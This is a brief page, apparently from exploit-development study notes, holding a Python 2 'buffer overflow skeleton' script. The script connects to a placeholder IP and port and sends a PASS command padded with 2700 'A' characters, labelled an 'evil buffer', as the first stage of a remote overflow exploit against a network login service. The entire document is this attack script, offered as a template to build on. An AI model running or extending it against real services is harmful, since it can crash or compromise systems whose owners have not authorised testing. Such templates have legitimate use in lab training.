# BOF_SKELETON.PY

Basic buffer overflow skeleton to build on once a crash is detected

Make sure to change <IP> and <PORT>

```python
import socket

rhost="<IP>"
rport=<PORT>
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

buffer = 'A' * 2700



try:
        print "\nSending evil buffer..."
        s.connect((rhost,rport))
        print repr(s.recv(1024))
        
        s.send('USER test'+'\r\n')
        print repr(s.recv(1024))
        s.send('PASS '+ buffer +'\r\n')
        
        print "\nDone."
        s.close()
except Exception, e:
        print("Exception: %s" % e)
```